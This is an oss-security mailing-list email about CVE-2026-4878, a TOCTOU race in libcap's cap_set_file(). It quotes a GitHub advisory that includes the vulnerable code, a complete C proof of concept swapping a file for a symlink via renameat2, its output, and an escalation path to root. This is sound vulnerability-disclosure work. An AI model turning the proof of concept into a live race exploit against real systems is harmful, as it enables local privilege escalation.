Received: (qmail 31993 invoked by uid 550); 9 Apr 2026 03:05:25 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 5214 invoked from network); 9 Apr 2026 02:19:53 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
	s=k20201202; t=1775701184;
	bh=0gqbiqeTFSdPqKgGZuINp03XNk/upqlR7sZqhmO5EQ8=;
	h=References:In-Reply-To:From:Date:Subject:To:Cc:From;
	b=IxLndAPJ/NkPJXDj1G4FX/dsBnx+SDCpiimKZHqrzH6XZhykYY92uutpO4hWWnWfq
	 cIvul/XIN06LStxr+5QEr1tqVA/13wr1VPWBzPLkaoKkszGm0+X//zQOrB/RJ1y5yK
	 n8OjW2zwEG/XSOfoKZsPKUpSJw8JlNTCfMI1X0Bo1ch/2CILC/vTw3RO9NQ9Gqx1HQ
	 7CvFn24eKf2gHY3pmWiOy/FmQKv2B1YIahD/XklAZI28KvkvuTN6tdWGL19yXKzNof
	 scOJt64bJevBN6mh9yGj9DxB3wnJm73kg2oQUnjFP5pQMhpvAhCdyVj4t6pPwLzMq0
	 pbi1OLvxxEsBw==
X-Gm-Message-State: AOJu0YzOnevN/hJbB3cZX3WK5BDW5OCce6D/mfWX4La9SFCsbHKJ+Vq5
	R7ZIpIUnBhKbZdS/b/RVVpaaXQFPraSZEnxAMhNB94uXqB4/m960kEDgGAqf6vo/3zqwzG0fR5Z
	YoN8WZxUDyCmONHK6P2jZxUV58CcHzSU=
X-Received: by 2002:a05:6a20:7d9b:b0:39b:e3aa:df2d with SMTP id
 adf61e73a8af0-39fc928ecbemr1631434637.7.1775701183669; Wed, 08 Apr 2026
 19:19:43 -0700 (PDT)
MIME-Version: 1.0
References: <CACmP8U+CbkozUQ1OqxsXMxLgMYvQS85QsWaGtVGBD8BFox34=w@mail.gmail.com>
 <fa4662c4-ce58-48ec-85a4-b0272ca9931a@seltendoof.de> <20260409013620.GA13098@openwall.com>
In-Reply-To: <20260409013620.GA13098@openwall.com>
From: "Andrew G. Morgan" <morgan@kernel.org>
Date: Wed, 8 Apr 2026 19:19:31 -0700
X-Gmail-Original-Message-ID: <CACmP8UKMsyDGzMSbuu_tORKR9p2EUhCE_qY6YcFf_w19ZcZaqw@mail.gmail.com>
X-Gm-Features: AQROBzAErhNwgHhXrWtmNDu1RZuY9ay5_VmGJ5wxsmrZPm91OFl9BU1A3D6wKO4
Message-ID: <CACmP8UKMsyDGzMSbuu_tORKR9p2EUhCE_qY6YcFf_w19ZcZaqw@mail.gmail.com>
To: Solar Designer <solar@openwall.com>
Cc: oss-security@lists.openwall.com, Ali Raza <elirazamumtaz@gmail.com>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Subject: Re: [oss-security] libcap-2.77 (since libcap-2.04) has TOCTOU
 privilege escalation issue

On Wed, Apr 8, 2026 at 6:53=E2=80=AFPM Solar Designer <solar@openwall.com> =
wrote:
>
> Hi all,
>
> I think Andrew may not be subscribed - CC'ing.
>
> On Tue, Apr 07, 2026 at 10:14:42PM +0200, Christian G=C3=B6ttsche wrote:
> > Apr 7, 2026 18:54:22 Andrew G. Morgan <morgan@kernel.org>:
> > > I've just released libcap-2.78 which includes a fix for a TOCTOU issue
> > > in libcap.
> > >
> > > The issue has been allocated the following code: CVE-2026-4878. It is
> > > the subject of this private bug:
> > > https://bugzilla.redhat.com/show_bug.cgi?id=3D2447554 and is also
> > > written up in a github.com advisory which I will publish on Wednesday
> > > (this week). The github advisory tool characterizes the issue as
> > > CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H (Severity: Moderate 7 /
> > > 10).
> > >
> > > The fix for pretty much that whole range of libcap releases is this c=
ommit:
> > >
> > > https://git.kernel.org/pub/scm/libs/libcap/libcap.git/commit/?id=3D28=
6ace1259992bd0c5d9016715833f2e148ac596
> >
> > Hi,
> >
> > the new code suppports changing the file capabilities of all kinds of f=
iles (not just regular)(given that the caller has read permissions).
> > Is that intended?
>
> Andrew, please comment on this.  I do also see it in the patch that the
> S_ISREG check is now below the added fast path code for readable files.
> It doesn't matter that the S_ISLNK check is also below (in fact, it's
> now redundant anyway) due to O_NOFOLLOW, but bypass of the S_ISREG check
> appears to be a functional change.

Not sure I follow. This check is in the cap_set_fd() function itself.

>
> Also, was the fact that cap_set_file() refuses to operate over a symlink
> (for the last pathname component only) documented and expected behavior?
> Maybe not documented, but assumed expected?  The advisory says:

The code has always been intended to avoid operating on a symlink.

https://git.kernel.org/pub/scm/libs/libcap/libcap.git/commit/?id=3Ddf44db73=
0f904c9fb1fdb83ab7f78abe8bd62844

>
> > for example, an administrator running setcap, a CI/CD pipeline setting
> > capabilities on build artifacts, a container runtime configuring
> > binaries, or a package manager post-install script) can exploit the race
> > to redirect file capabilities to their own executable. The attacker
> > never needs elevated privileges; only write access to the directory
> > containing the target path.
>
> While this sounds valid, making changes in an attacker-writable
> directory is inherently dangerous, and I wouldn't see why expectations

I agree.

> for cap_set_file() and setcap would be different than for chmod() and
> chmod, which follow symlinks, if there weren't already this incomplete
> racy attempt of pre-checking for and refusing to operate on symlinks.

But the idea that the code was protecting from symlink following when
it wasn't represents a bug.

>
> > > PS I tried a few times to post to the private openwall list about this
> > > issue 9 days ago, but my email bounced (likely because I couldn't
> > > effectively follow the mail formatting requirements). I might have
> > > realized that the emails were bounced if gmail hadn't silently placed
> > > the bounced replies in my SPAM folder. Sorry about that.
>
> Sorry you had difficulties with that.  I just searched through the logs,
> but could not easily find traces of you trying to send this to the
> linux-distros list.  Can you please forward the bounce to me off-list?
>

Will do.

> As to your oss-security postings presumably flagged by Gmail as spam,
> that is likely due to us breaking DKIM with the addition of the
> [oss-security] prefix and kernel.org having DMARC p=3Dquarantine.  In
> cases like this, a workaround is to pre-add [oss-security] on your end
> (and when you add to the thread, reply to your messages as they arrived
> through the list rather than to your local copies without the prefix).
> Sorry about that as well.
>
> Let's also have the GitHub advisory archived in here:
>
> https://github.com/AndrewGMorgan/libcap_mirror/security/advisories/GHSA-f=
78v-p5hx-m7hh

Just to be clear, and credit where it is due, the text of this was
authored by Ali Raza.

The markdown source is as follows:

---8<---

Local Privilege Escalation (LPE) via TOCTOU race condition in
cap_set_file() through file capability injection

### Summary

A TOCTOU (Time-of-Check-Time-of-Use) race condition in
`cap_set_file()` allows an unprivileged local attacker to redirect
file capability writes to an arbitrary file, leading to local
privilege escalation. The function validates the target path with
`lstat()` (which does not follow symlinks) but then operates on it
with `setxattr()` (which does follow symlinks). Between these two
calls, an attacker with write access to the parent directory can
atomically swap the regular file for a symlink or a different file via
`renameat2(RENAME_EXCHANGE)`, causing `setxattr()` to write the
`security.capability` xattr to the attacker's chosen file instead of
the intended target.

### Details

The vulnerability is in
[libcap/cap_file.c](https://github.com/AndrewGMorgan/libcap_mirror/blob/5f3=
e12ca39c476b78160df6e2345a642a8e6f178/libcap/cap_file.c),
function [`cap_set_file()`](https://github.com/AndrewGMorgan/libcap_mirror/=
blob/5f3e12ca39c476b78160df6e2345a642a8e6f178/libcap/cap_file.c#L320):

```c
int cap_set_file(const char *filename, cap_t cap_d)
{
    struct vfs_ns_cap_data rawvfscap;
    int sizeofcaps;
    struct stat buf;

    // CHECK: lstat does NOT follow symlinks
    if (lstat(filename, &buf) !=3D 0) {
        return -1;
    }
    if (S_ISLNK(buf.st_mode) || !S_ISREG(buf.st_mode)) {
        errno =3D EINVAL;
        return -1;
    }

    // ... _fcaps_save() computation widens the race window ...

    if (cap_d =3D=3D NULL) {
        // USE: removexattr FOLLOWS symlinks
        return removexattr(filename, XATTR_NAME_CAPS);
    }

    // USE: setxattr FOLLOWS symlinks
    return setxattr(filename, XATTR_NAME_CAPS, &rawvfscap, sizeofcaps, 0);
}
```

The gap between `lstat()` and `setxattr()` or `removexattr()` creates
a race window. During this window an attacker with write access to the
parent directory can use `renameat2(RENAME_EXCHANGE)` to atomically
swap the legitimate regular file with either a symlink pointing to the
attacker's target or a completely different file. Since `setxattr()`
resolves the path from scratch (following symlinks), it writes the
capability xattr to the wrong file.

The same pattern affects the `removexattr()` path at when `cap_d =3D=3D
NULL`, allowing an attacker to strip capabilities from an unintended
file.

For comparison, the fd-based counterpart `cap_set_fd()` is not
vulnerable because it uses `fstat()` + `fsetxattr()` on an
already-opened file descriptor, which pins the inode.

The `setcap` tool
[`progs/setcap.c`](https://github.com/AndrewGMorgan/libcap_mirror/blob/5f3e=
12ca39c476b78160df6e2345a642a8e6f178/progs/setcap.c)
calls `cap_set_file()` directly with a user-supplied path, making it
the primary attack surface.

### PoC

The following self-contained C program deterministically reproduces
the vulnerability by executing the `lstat` =E2=86=92 `swap` =E2=86=92 `setx=
attr`
sequence step by step. No race timing is required.

**Requirements:** Linux 3.15+ (for `renameat2`), root or `CAP_SETFCAP`.

**Build and run:**
```
gcc -Wall -O2 -o poc poc.c
sudo ./poc
```

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <sys/syscall.h>

#ifndef SYS_renameat2
#define SYS_renameat2 316
#endif
#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE (1 << 1)
#endif

#define XATTR_NAME_CAPS "security.capability"

/*
 * Minimal VFS_CAP_REVISION_2 xattr granting CAP_NET_RAW=3Dep.
 *
 * struct vfs_cap_data {
 *   __le32 magic_etc;    // VFS_CAP_REVISION_2 | VFS_CAP_FLAGS_EFFECTIVE
 *   struct { __le32 permitted, inheritable; } data[2];
 * };
 *
 * CAP_NET_RAW =3D 13 -> bit 13 in data[0].permitted =3D 0x00002000
 */
static const unsigned char xattr_cap_net_raw[20] =3D {
    0x01, 0x00, 0x00, 0x02,  /* magic: VFS_CAP_REVISION_2 | EFFECTIVE */
    0x00, 0x20, 0x00, 0x00,  /* data[0].permitted =3D 1 << 13 */
    0x00, 0x00, 0x00, 0x00,  /* data[0].inheritable =3D 0 */
    0x00, 0x00, 0x00, 0x00,  /* data[1].permitted =3D 0 */
    0x00, 0x00, 0x00, 0x00,  /* data[1].inheritable =3D 0 */
};

static char arena[256], decoy[280], target[280], link_path[280];

static void cleanup(void) {
    removexattr(target, XATTR_NAME_CAPS);
    unlink(decoy); unlink(link_path); unlink(target); rmdir(arena);
}

int main(void)
{
    struct stat st;
    int fd, ret;
    char buf[20];
    ssize_t len;

    if (geteuid() !=3D 0) {
        fprintf(stderr, "Requires root (for setxattr on
security.capability).\n");
        return 1;
    }

    snprintf(arena,     sizeof(arena),     "/tmp/cve_poc_%d", getpid());
    snprintf(decoy,     sizeof(decoy),     "%s/decoy",  arena);
    snprintf(target,    sizeof(target),     "%s/target", arena);
    snprintf(link_path, sizeof(link_path),  "%s/link",   arena);

    atexit(cleanup);
    mkdir(arena, 0755);

    fd =3D open(decoy, O_CREAT|O_WRONLY|O_TRUNC, 0755); close(fd);
    fd =3D open(target, O_CREAT|O_WRONLY|O_TRUNC, 0755); close(fd);
    if (symlink(target, link_path) !=3D 0) { perror("symlink"); return 1; }

    printf("cap_set_file() TOCTOU =E2=80=94 deterministic proof\n\n");

    /* Step 1: lstat sees a regular file =E2=80=94 cap_set_file() check pas=
ses */
    lstat(decoy, &st);
    printf("[+] lstat(\"%s\"): S_ISREG=3D%d S_ISLNK=3D%d\n",
           decoy, S_ISREG(st.st_mode), S_ISLNK(st.st_mode));
    printf("    cap_set_file() symlink check PASSES\n\n");

    /* Step 2: attacker atomically swaps decoy with symlink */
    ret =3D syscall(SYS_renameat2, AT_FDCWD, link_path,
                  AT_FDCWD, decoy, RENAME_EXCHANGE);
    if (ret !=3D 0) {
        fprintf(stderr, "renameat2 failed: %s\n", strerror(errno));
        return 1;
    }

    lstat(decoy, &st);
    printf("[+] Attacker swaps (renameat2 RENAME_EXCHANGE):\n");
    printf("    lstat(\"%s\"): S_ISLNK=3D%d =E2=80=94 now a symlink\n\n", d=
ecoy,
           S_ISLNK(st.st_mode));

    /* Step 3: setxattr follows the symlink =E2=80=94 writes caps to target=
 */
    ret =3D setxattr(decoy, XATTR_NAME_CAPS,
                   xattr_cap_net_raw, sizeof(xattr_cap_net_raw), 0);
    printf("[+] setxattr(\"%s\", \"security.capability\", ...): %s\n",
           decoy, ret =3D=3D 0 ? "OK" : strerror(errno));
    printf("    setxattr FOLLOWED the symlink to target\n\n");

    /* Step 4: verify capabilities landed on the target file */
    len =3D getxattr(target, XATTR_NAME_CAPS, buf, sizeof(buf));
    printf("[+] getxattr(\"%s\"): %zd bytes\n", target, len);

    if (len > 0) {
        printf("\n    BUG CONFIRMED: capabilities written to WRONG file.\n"=
);
        return 0;
    } else {
        printf("\n    Unexpected: xattr not found on target.\n");
        return 1;
    }
}
```

**Expected output:**
```
cap_set_file() TOCTOU =E2=80=94 deterministic proof

[+] lstat("/tmp/cve_poc_XXXX/decoy"): S_ISREG=3D1 S_ISLNK=3D0
    cap_set_file() symlink check PASSES

[+] Attacker swaps (renameat2 RENAME_EXCHANGE):
    lstat("/tmp/cve_poc_XXXX/decoy"): S_ISLNK=3D1 =E2=80=94 now a symlink

[+] setxattr("/tmp/cve_poc_XXXX/decoy", "security.capability", ...): OK
    setxattr FOLLOWED the symlink to target

[+] getxattr("/tmp/cve_poc_XXXX/target"): 20 bytes

    BUG CONFIRMED: capabilities written to WRONG file.
```

### Impact

This is a local privilege escalation vulnerability (CWE-367).

An unprivileged local attacker who has write access to a directory
where a privileged process calls `cap_set_file()` (for example, an
administrator running `setcap`, a CI/CD pipeline setting capabilities
on build artifacts, a container runtime configuring binaries, or a
package manager post-install script) can exploit the race to redirect
file capabilities to their own executable. The attacker never needs
elevated privileges; only write access to the directory containing the
target path.

By injecting capabilities such as `CAP_SETUID` onto their own binary,
the attacker can then execute it, call `setuid(0)`, and escalate to
root.

The attacker's primitives are:
- **Arbitrary file capability injection**: redirect any
`cap_set_file()` call to write capabilities to an attacker-chosen file
on the same filesystem.
- **Arbitrary file capability removal**: redirect the `removexattr()`
path (when `cap_d =3D=3D NULL`) to strip capabilities from an unintended
file, enabling defense evasion.

All versions of libcap that include the symlink check in
`cap_set_file()` are believed to be affected. The `setcap` tool
shipped with libcap is the primary real-world attack vector as it
calls `cap_set_file()` directly with a user-supplied path argument.


---8<---

Cheers

Andrew
